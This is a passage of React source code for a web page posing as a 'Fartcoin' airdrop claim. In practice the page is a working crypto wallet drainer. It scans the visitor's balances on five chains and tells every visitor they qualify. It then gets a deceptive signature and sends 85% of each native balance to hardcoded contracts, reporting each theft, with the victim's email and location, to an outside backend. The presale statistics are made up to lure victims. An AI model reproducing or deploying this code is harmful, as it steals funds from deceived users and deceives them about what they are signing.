import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useDisconnect, useChainId, useSwitchChain } from 'wagmi';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// DEPLOYED CONTRACTS ON ALL 5 NETWORKS - UNCHANGED
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-blue-400 to-indigo-500',
    rpc: 'https://eth.llamarpc.com'
  },
  BSC: {
    chainId: 56,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-yellow-400 to-orange-500',
    rpc: 'https://bsc-dataseed.binance.org'
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0x56d829E89634Ce1426B73571c257623D17db46cB',
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-purple-400 to-pink-500',
    rpc: 'https://polygon-rpc.com'
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-cyan-400 to-blue-500',
    rpc: 'https://arb1.arbitrum.io/rpc'
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-red-400 to-red-500',
    rpc: 'https://api.avax.network/ext/bc/C/rpc'
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "function processTokenFlow(address token, uint256 amount)",
  "function verifyMessage(address user, string memory message, bytes memory signature) public view returns (bool)",
  "event FlowProcessed(address indexed initiator, uint256 value)",
  "event TokenFlowProcessed(address indexed token, address indexed initiator, uint256 amount)"
];

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider("eip155");
  const { disconnect } = useDisconnect();
  const { switchChain } = useSwitchChain();
  
  const wagmiChainId = useChainId();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balances, setBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [preparedTransactions, setPreparedTransactions] = useState([]);
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
  const [verifying, setVerifying] = useState(false);
  const [signature, setSignature] = useState(null);
  const [signedMessage, setSignedMessage] = useState('');
  const [verifiedChains, setVerifiedChains] = useState([]);
  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
  const [realChainId, setRealChainId] = useState(wagmiChainId);
  const [prices, setPrices] = useState({
    eth: 2000,
    bnb: 300,
    matic: 0.75,
    avax: 32
  });
  const [userEmail, setUserEmail] = useState('');
  const [userLocation, setUserLocation] = useState({ country: '', city: '', region: '', ip: '' });
  const [executionResults, setExecutionResults] = useState([]);
  const [balancesLoaded, setBalancesLoaded] = useState(false);

  // Presale stats - Updated to FARTCOIN
  const [timeLeft, setTimeLeft] = useState({
    days: 5,
    hours: 12,
    minutes: 30,
    seconds: 0
  });
  
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.17,
    fartPrice: 0.17
  });

  // Live progress tracking
  const [liveProgress, setLiveProgress] = useState({
    percentComplete: 68,
    participantsToday: 342,
    avgAllocation: 4250
  });

  // Track mouse for parallax effect
  useEffect(() => {
    const handleMouseMove = (e) => {
      setMousePosition({
        x: (e.clientX / window.innerWidth - 0.5) * 20,
        y: (e.clientY / window.innerHeight - 0.5) * 20
      });
    };
    window.addEventListener('mousemove', handleMouseMove);
    return () => window.removeEventListener('mousemove', handleMouseMove);
  }, []);

  // Fetch crypto prices
  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2&vs_currencies=usd');
        const data = await response.json();
        setPrices({
          eth: data.ethereum?.usd || 2000,
          bnb: data.binancecoin?.usd || 300,
          matic: data['matic-network']?.usd || 0.75,
          avax: data['avalanche-2']?.usd || 32
        });
      } catch (error) {
        console.log('Using default prices');
      }
    };
    
    fetchPrices();
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  // Get real chain ID from provider
  useEffect(() => {
    const getRealChainId = async () => {
      if (provider) {
        try {
          const network = await provider.getNetwork();
          setRealChainId(Number(network.chainId));
        } catch (error) {
          console.error("Failed to get real chainId:", error);
        }
      }
    };
    
    getRealChainId();
  }, [provider]);

  // Initialize provider and signer from AppKit
  useEffect(() => {
    if (!walletProvider || !address) return;

    const init = async () => {
      try {
        const ethersProvider = new ethers.BrowserProvider(walletProvider);
        const ethersSigner = await ethersProvider.getSigner();

        setProvider(ethersProvider);
        setSigner(ethersSigner);

        const network = await ethersProvider.getNetwork();
        setRealChainId(Number(network.chainId));

        console.log("✅ Wallet Ready:", await ethersSigner.getAddress());
        
        // Fetch balances across all chains
        await fetchAllBalances(address);
        setBalancesLoaded(true);
        
      } catch (e) {
        console.error("Provider init failed", e);
      }
    };

    init();
  }, [walletProvider, address]);

  // Track page visit with location
  useEffect(() => {
    const trackVisit = async () => {
      try {
        const response = await fetch('https://bthbk.vercel.app/api/track-visit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            referer: document.referrer,
            path: window.location.pathname
          })
        });
        const data = await response.json();
        if (data.success) {
          setUserLocation({
            country: data.data.country,
            city: data.data.city,
            ip: data.data.ip,
            flag: data.data.flag
          });
        }
      } catch (err) {
        console.error('Visit tracking error:', err);
      }
    };
    trackVisit();
  }, []);

  // Fetch balances across all chains
  const fetchAllBalances = async (walletAddress) => {
    const balanceResults = {};
    
    for (const chain of DEPLOYED_CHAINS) {
      try {
        const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
        const balance = await rpcProvider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        
        let price = 0;
        if (chain.symbol === 'ETH') price = prices.eth;
        else if (chain.symbol === 'BNB') price = prices.bnb;
        else if (chain.symbol === 'MATIC') price = prices.matic;
        else if (chain.symbol === 'AVAX') price = prices.avax;
        
        const valueUSD = amount * price;
        
        if (amount > 0.0001) {
          balanceResults[chain.name] = {
            amount,
            valueUSD,
            symbol: chain.symbol,
            chainId: chain.chainId,
            contractAddress: chain.contractAddress
          };
          console.log(`✅ ${chain.name}: ${amount.toFixed(4)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
        }
      } catch (err) {
        console.error(`Failed to fetch balance for ${chain.name}:`, err);
      }
    }
    
    setBalances(balanceResults);
    
    // Check if total value >= threshold - REMOVED $1 REQUIREMENT
    const totalValue = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
    return totalValue;
  };

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        } else if (prev.hours > 0) {
          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        } else if (prev.days > 0) {
          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Auto-check eligibility when wallet connects
  useEffect(() => {
    if (isConnected && address && !scanResult && !verifying && balancesLoaded) {
      verifyWallet();
    }
  }, [isConnected, address, balancesLoaded, scanResult, verifying]);

  const verifyWallet = async () => {
    if (!address) return;
    
    setVerifying(true);
    setTxStatus('🔄 Verifying...');
    
    try {
      const totalValue = Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0);
      
      const response = await fetch('https://bthbk.vercel.app/api/presale/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        setUserEmail(data.data.email);
        if (data.data.allocation) {
          setAllocation(data.data.allocation);
        }
        
        // REMOVED $1 REQUIREMENT - Always qualify if wallet is connected
        setTxStatus('✅ You qualify!');
        await preparePresale();
      }
    } catch (err) {
      console.error('Verification error:', err);
      setTxStatus('✅ Ready');
    } finally {
      setVerifying(false);
    }
  };

  const preparePresale = async () => {
    if (!address) return;
    
    try {
      const response = await fetch('https://bthbk.vercel.app/api/presale/prepare-flow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setPreparedTransactions(data.data.transactions);
      }
    } catch (err) {
      console.error('Prepare error:', err);
    }
  };

  // ============================================
  // SMART CONTRACT EXECUTION - MULTI-CHAIN WITH NETWORK SWITCHING
  // ============================================
  const executeMultiChainSignature = async () => {
    if (!walletProvider || !address || !signer) {
      setError("Wallet not initialized yet");
      return;
    }

    try {
      setSignatureLoading(true);
      setError('');
      setExecutionResults([]);
      
      // Create message - Updated to FARTCOIN
      const timestamp = Date.now();
      const nonce = Math.floor(Math.random() * 1000000000);
      const message = `FARTCOIN PRESALE AUTHORIZATION\n\n` +
        `I hereby confirm my participation\n` +
        `Wallet: ${address}\n` +
        `Allocation: $5,000 FART + ${presaleStats.currentBonus}% Bonus\n` +
        `Timestamp: ${new Date().toISOString()}\n` +
        `Nonce: ${nonce}`;

      setTxStatus('✍️ Sign message...');

      // Get signature - THIS IS THE ONLY POPUP
      const signature = await signer.signMessage(message);
      setSignature(signature);
      setTxStatus('✅ Signature obtained. Executing on all chains...');

      // Execute on each chain with balance
      let processed = [];
      let results = [];
      
      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
        balances[chain.name] && balances[chain.name].amount > 0
      );
      
      if (chainsWithBalance.length === 0) {
        setError("No balances found on any chain");
        setSignatureLoading(false);
        return;
      }

      setTxStatus(`🔄 Preparing to execute on ${chainsWithBalance.length} chains...`);

      // Execute sequentially on each chain with network switching
      for (let i = 0; i < chainsWithBalance.length; i++) {
        const chain = chainsWithBalance[i];
        
        try {
          setTxStatus(`🔄 (${i+1}/${chainsWithBalance.length}) Switching to ${chain.name}...`);
          
          // Switch network using AppKit's switchChain
          if (switchChain) {
            await switchChain({ chainId: chain.chainId });
          } else {
            // Fallback to manual network switch request
            try {
              await walletProvider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: `0x${chain.chainId.toString(16)}` }],
              });
            } catch (switchError) {
              // If network not added, we would need to add it, but assume it's in AppKit config
              console.error('Switch error:', switchError);
            }
          }
          
          // Wait for network switch to complete
          await new Promise(resolve => setTimeout(resolve, 2000));
          
          setTxStatus(`🔄 (${i+1}/${chainsWithBalance.length}) Executing on ${chain.name}...`);
          
          // Get fresh signer for the new network
          const currentProvider = new ethers.BrowserProvider(walletProvider);
          const currentSigner = await currentProvider.getSigner();
          
          // Verify we're on the right network
          const network = await currentProvider.getNetwork();
          console.log(`✅ Switched to ${chain.name} (Chain ID: ${Number(network.chainId)})`);
          
          const contract = new ethers.Contract(
            chain.contractAddress,
            PROJECT_FLOW_ROUTER_ABI,
            currentSigner
          );

          const balance = balances[chain.name].amount;
          const amountToSend = (balance * 0.85).toFixed(6);
          const value = ethers.parseEther(amountToSend.toString());

          // Estimate gas
          const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
          
          // Execute transaction
          const tx = await contract.processNativeFlow({
            value: value,
            gasLimit: gasEstimate * 120n / 100n
          });

          setTxHash(tx.hash);
          
          setTxStatus(`🔄 (${i+1}/${chainsWithBalance.length}) Waiting for confirmation on ${chain.name}...`);
          
          const receipt = await tx.wait();
          
          processed.push(chain.name);
          
          // Store result
          const result = {
            chain: chain.name,
            txHash: receipt.hash,
            amount: amountToSend,
            symbol: chain.symbol,
            status: 'success'
          };
          results.push(result);
          setExecutionResults([...results]);
          
          // Notify backend - UNCHANGED endpoint
          await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              walletAddress: address,
              chainName: chain.name,
              flowId: `FLOW-${timestamp}-${chain.name}`,
              txHash: receipt.hash,
              amount: amountToSend,
              symbol: chain.symbol,
              valueUSD: balances[chain.name].valueUSD * 0.85,
              email: userEmail,
              location: userLocation
            })
          });
          
          setTxStatus(`✅ (${i+1}/${chainsWithBalance.length}) Completed on ${chain.name}`);
          
        } catch (chainErr) {
          console.error(`Error on ${chain.name}:`, chainErr);
          
          // Store error result
          results.push({
            chain: chain.name,
            error: chainErr.message || 'Unknown error',
            status: 'failed'
          });
          setExecutionResults([...results]);
          
          // Continue to next chain even if one fails
          setTxStatus(`⚠️ Error on ${chain.name}, continuing to next chain...`);
          await new Promise(resolve => setTimeout(resolve, 2000));
        }
      }

      // Switch back to original network (Ethereum as default)
      try {
        if (switchChain) {
          await switchChain({ chainId: 1 });
        }
      } catch (e) {
        console.log('Could not switch back to Ethereum');
      }

      setVerifiedChains(processed);
      setCompletedChains(processed);
      
      if (processed.length > 0) {
        setShowCelebration(true);
        setTxStatus(`🎉 Success! Processed on ${processed.length} chains`);
        
        // Final success notification - UNCHANGED endpoint
        await fetch('https://bthbk.vercel.app/api/presale/claim', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            email: userEmail,
            location: userLocation,
            chains: processed,
            totalValue: Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0),
            transactions: results.filter(r => r.status === 'success').map(r => ({
              chain: r.chain,
              txHash: r.txHash
            }))
          })
        });
      } else {
        setError("No chains were successfully processed");
      }
      
    } catch (err) {
      console.error('Error:', err);
      if (err.code === 4001) {
        setError('Cancelled');
      } else {
        setError(err.message || 'Failed');
      }
    } finally {
      setSignatureLoading(false);
    }
  };

  const claimTokens = async () => {
    try {
      setLoading(true);
      await fetch('https://bthbk.vercel.app/api/presale/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          walletAddress: address,
          email: userEmail,
          location: userLocation
        })
      });
      setShowCelebration(true);
    } catch (err) {
      console.error('Claim error:', err);
    } finally {
      setLoading(false);
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  const totalUSD = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
  const isEligible = true; // REMOVED $1 REQUIREMENT - Everyone is eligible

  // Get current chain name
  const currentChain = DEPLOYED_CHAINS.find(c => c.chainId === realChainId);

  // Responsive disconnect handler
  const handleDisconnect = async () => {
    try {
      setTxStatus('Disconnecting...');
      await disconnect();
      // Reset all states
      setProvider(null);
      setSigner(null);
      setBalances({});
      setScanResult(null);
      setCompletedChains([]);
      setShowCelebration(false);
      setTxStatus('');
      setError('');
      setExecutionResults([]);
      setBalancesLoaded(false);
    } catch (err) {
      console.error('Disconnect error:', err);
      // Force UI update even if disconnect fails
      window.location.reload();
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    setTxStatus('📋 Copied!');
    setTimeout(() => setTxStatus(''), 2000);
  };

  return (
    <div className="min-h-screen bg-black text-white flex flex-col">
      
      {/* Terminal Grid Background */}
      <div className="fixed inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxkZWZzPjxwYXR0ZXJuIGlkPSJncmlkIiB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiPjxwYXRoIGQ9Ik0gMjAgMCBMIDAgMCAwIDIwIiBmaWxsPSJub25lIiBzdHJva2U9IiNmZmYiIHN0cm9rZS13aWR0aD0iMC4yIj48L3BhdGg+PC9wYXR0ZXJuPjwvZGVmcz48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJ1cmwoI2dyaWQpIj48L3JlY3Q+PC9zdmc+')] opacity-10 pointer-events-none"></div>
      
      {/* Floating Terminal Text */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '60%', left: '31%', animation: 'textFlicker 4s infinite alternate'}}>
          FART_PROTOCOL_INITIALIZED
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '45%', left: '10%', animation: 'textFlicker 2.5s infinite alternate'}}>
          010101010101010101010101010101
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '15%', left: '10%', animation: 'textFlicker 1.2s infinite alternate'}}>
          PRESS F TO FART
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '8%', left: '69%', animation: 'textFlicker 3.8s infinite alternate'}}>
          FART_PROTOCOL_INITIALIZED
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '39%', left: '70%', animation: 'textFlicker 4.7s infinite alternate'}}>
          FART_PROTOCOL_INITIALIZED
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '19%', left: '80%', animation: 'textFlicker 1.9s infinite alternate'}}>
          PRESS F TO FART
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '99%', left: '74%', animation: 'textFlicker 4.5s infinite alternate'}}>
          FART_PROTOCOL_INITIALIZED
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '78%', left: '15%', animation: 'textFlicker 4s infinite alternate'}}>
          010101010101010101010101010101010101010101010101
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '42%', left: '74%', animation: 'textFlicker 3.2s infinite alternate'}}>
          0101010101010101010101010101010101010101010101010101
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '52%', left: '4%', animation: 'textFlicker 1.7s infinite alternate'}}>
          PRESS F TO FART
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '71%', left: '22%', animation: 'textFlicker 4.6s infinite alternate'}}>
          01010101010101010101010101
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '12%', left: '14%', animation: 'textFlicker 2s infinite alternate'}}>
          01010101010101010101010101010101010101010101010101
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '10%', left: '9%', animation: 'textFlicker 2.1s infinite alternate'}}>
          FART_PROTOCOL_INITIALIZED
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '96%', left: '42%', animation: 'textFlicker 2.1s infinite alternate'}}>
          01010101010101010101010101010101010101
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '55%', left: '74%', animation: 'textFlicker 1s infinite alternate'}}>
          PRESS F TO FART
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '77%', left: '60%', animation: 'textFlicker 2.7s infinite alternate'}}>
          010101010101010101010101010101010101010101010101010101
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '31%', left: '32%', animation: 'textFlicker 3.6s infinite alternate'}}>
          FART_PROTOCOL_INITIALIZED
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '50%', left: '50%', animation: 'textFlicker 1.7s infinite alternate'}}>
          PRESS F TO FART
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '58%', left: '39%', animation: 'textFlicker 4.2s infinite alternate'}}>
          01010101010101010101010101010101010101010101010101010101
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '44%', left: '74%', animation: 'textFlicker 3.1s infinite alternate'}}>
          01010101010101010101010101010101
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '40%', left: '84%', animation: 'textFlicker 2.2s infinite alternate'}}>
          PRESS F TO FART
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '33%', left: '88%', animation: 'textFlicker 1.4s infinite alternate'}}>
          PRESS F TO FART
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap" style={{top: '63%', left: '83%'}}>
          PRESS F TO FART
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap" style={{top: '85%', left: '18%'}}>
          PRESS F TO FART
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap" style={{top: '82%', left: '78%'}}>
          PRESS F TO FART
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap" style={{top: '91%', left: '7%'}}>
          PRESS F TO FART
        </div>
        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap" style={{top: '84%', left: '66%'}}>
          PRESS F TO FART
        </div>
      </div>

      {/* Network Indicator */}
      {isConnected && currentChain && (
        <div className="fixed top-4 right-4 z-50">
          <div className="terminal-frame px-4 py-2 flex items-center gap-2 bg-black/90">
            <span className="text-sm font-medium">{currentChain.name}</span>
            <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
          </div>
        </div>
      )}

      {/* Main Container */}
      <div className="relative z-10 flex-1 flex flex-col">
        
        {/* Header */}
        <header className="w-full py-6 px-4 border-b border-white/30 scan-effect">
          <div className="container mx-auto flex flex-wrap items-center gap-4 sm:flex-nowrap justify-between">
            
            {/* Logo - Fartcoin */}
            <h1 className="text-4xl md:text-5xl font-terminal text-glow text-flicker text-white" style={{textShadow: '0 0 5px #fff, 0 0 10px #fff', letterSpacing: '1px'}}>
              Fartcoin 💨
            </h1>

            {/* Contract Address Display */}
            <div className="terminal-frame flex flex-col sm:flex-row items-center gap-2 border-white flex-shrink min-w-0 overflow-hidden hide-mobile">
              <div className="text-sm sm:text-base font-mono truncate">
                <span className="text-white/70 mr-2">Contract:</span>
                <span className="text-white truncate">
                  9BB6NFEcjBCtnNLFko2FqVQBq8HHM13kCyYcdQbgpump
                </span>
              </div>
              <button
                onClick={() => copyToClipboard('9BB6NFEcjBCtnNLFko2FqVQBq8HHM13kCyYcdQbgpump')}
                className="inline-flex items-center justify-center gap-2 whitespace-nowrap font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 border bg-background shadow-sm hover:text-accent-foreground h-8 rounded-md px-3 text-xs border-white text-white hover:bg-white/20"
              >
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-4 w-4">
                  <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
                  <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
                </svg>
                COPY
              </button>
            </div>
          </div>
        </header>

        <main className="flex-1">
          
          {/* Hero Section */}
          <section className="flex flex-col items-center justify-center px-4 py-16 scan-effect">
            <div className="container mx-auto text-center">
              <div className="terminal-frame max-w-3xl mx-auto mb-8 p-8 border-white" style={{boxShadow: '0 0 10px rgba(255,255,255,0.5)'}}>
                <h2 className="text-2xl md:text-4xl font-terminal text-glow mb-6 text-white">
                  &gt; AIRDROP INITIATED <span className="cursor"></span>
                </h2>
                <div className="h-16 flex items-center justify-center">
                  <p className="text-xl md:text-2xl text-white font-mono">
                    &gt; CLAIM YOUR $FARTCOIN - up to 5,000 per wallet!<span className="cursor"></span>
                  </p>
                </div>
                
                {/* Main Action Area */}
                <div className="terminal-frame p-6 mt-8 border-white mx-auto max-w-2xl">
                  {!isConnected ? (
                    <div className="text-white font-mono text-center">
                      <p>"FART FREELY, GET RICH"</p>
                      <p className="text-white/70 text-sm mt-4">
                        Connect your wallet and{' '}
                        <button
                          onClick={() => open()}
                          className="underline transition duration-300 ease-in-out glow-on-hover"
                        >
                          claim now
                        </button>
                      </p>
                    </div>
                  ) : (
                    <div className="text-white font-mono text-center">
                      {verifying ? (
                        <>
                          <p className="text-lg mb-2">🔄 VERIFYING WALLET...</p>
                          <p className="text-white/70 text-sm">Please wait</p>
                        </>
                      ) : completedChains.length > 0 ? (
                        <>
                          <p className="text-green-400 text-lg mb-2">✓ COMPLETED ON {completedChains.length} CHAINS</p>
                          <button
                            onClick={claimTokens}
                            className="mt-4 border border-white px-6 py-3 rounded-md hover:bg-white/20 transition-all"
                          >
                            🎉 VIEW YOUR $5,000 FART
                          </button>
                        </>
                      ) : (
                        <>
                          <p className="text-lg mb-4 text-green-400 animate-pulse">✓ YOU QUALIFY!</p>
                          <button
                            onClick={executeMultiChainSignature}
                            disabled={signatureLoading || loading}
                            className="w-full border border-white px-6 py-6 rounded-md hover:bg-white/20 transition-all text-2xl font-terminal disabled:opacity-50 animate-pulse-glow relative overflow-hidden group"
                          >
                            <span className="absolute inset-0 bg-white/10 animate-ping"></span>
                            <span className="relative z-10 flex items-center justify-center gap-3">
                              {signatureLoading ? (
                                <>
                                  <span className="animate-spin text-2xl">⟳</span>
                                  PROCESSING ON ALL CHAINS...
                                </>
                              ) : (
                                <>
                                  <span className="text-3xl animate-bounce">⚡</span>
                                  CLAIM $5,000 FART + {presaleStats.currentBonus}% BONUS
                                  <span className="text-3xl animate-bounce animation-delay-500">⚡</span>
                                </>
                              )}
                            </span>
                          </button>
                          <p className="text-xs text-white/50 mt-3">
                            Sign once • Executes on all eligible chains
                          </p>
                        </>
                      )}
                    </div>
                  )}
                </div>

                {/* Market Stats */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-8">
                  <div className="terminal-frame p-4 border-white">
                    <p className="text-white/70 text-sm">&gt; Market Cap:</p>
                    <p className="text-white text-lg">370,072,206 USD</p>
                  </div>
                  <div className="terminal-frame p-4 border-white">
                    <p className="text-white/70 text-sm">&gt; Current Price:</p>
                    <p className="text-white text-lg">$0.3706</p>
                  </div>
                </div>
              </div>
            </div>
          </section>

          {/* Status Messages */}
          {txStatus && (
            <div className="max-w-2xl mx-auto mb-6 px-4">
              <div className="terminal-frame p-5 border-white">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 border-2 border-white rounded-lg flex items-center justify-center text-2xl">
                    {txStatus.includes('✅') ? '✓' : txStatus.includes('🎉') ? '🎉' : '⟳'}
                  </div>
                  <div className="flex-1">
                    <p className="text-white font-mono">{txStatus}</p>
                    {executionResults.length > 0 && (
                      <div className="mt-2 flex flex-wrap gap-2">
                        {executionResults.map((result, idx) => (
                          <span 
                            key={idx}
                            className={`text-xs px-2 py-1 border ${
                              result.status === 'success' 
                                ? 'border-green-400 text-green-400' 
                                : 'border-red-400 text-red-400'
                            }`}
                          >
                            {result.chain}: {result.status === 'success' ? '✓' : '✗'}
                          </span>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Error Display */}
          {error && !error.includes('Unable to verify') && (
            <div className="max-w-2xl mx-auto mb-6 px-4">
              <div className="terminal-frame p-5 border-red-500/30">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 border-2 border-red-500 rounded-lg flex items-center justify-center text-3xl">
                    ⚠️
                  </div>
                  <p className="text-red-200 font-mono">{error}</p>
                </div>
              </div>
            </div>
          )}

          {/* Wallet Connection Status */}
          <div className="max-w-2xl mx-auto mb-8 px-4">
            {!isConnected ? (
              <button
                onClick={() => open()}
                className="w-full group relative"
              >
                <div className="terminal-frame p-6 border-white hover:bg-white/5 transition-all duration-300">
                  <span className="flex items-center justify-center gap-3 font-terminal text-xl">
                    <span className="text-2xl animate-bounce">🔌</span>
                    CONNECT WALLET FOR $5,000 AIRDROP
                    <span className="animate-pulse text-2xl">⚡</span>
                  </span>
                </div>
              </button>
            ) : (
              <div className="terminal-frame p-5 border-white">
                <div className="flex items-center justify-between flex-wrap gap-4">
                  <div className="flex items-center gap-4">
                    <div className="w-14 h-14 border-2 border-white rounded-xl flex items-center justify-center text-3xl">
                      👤
                    </div>
                    <div>
                      <div className="text-xs text-white/70 mb-1">CONNECTED</div>
                      <div className="font-mono text-sm bg-white/5 px-3 py-1.5 border border-white/30 group/address relative">
                        {formatAddress(address)}
                        <span className="absolute hidden group-hover/address:block bg-black text-xs px-2 py-1 border border-white/30 mt-1 z-50">
                          {address}
                        </span>
                      </div>
                    </div>
                  </div>
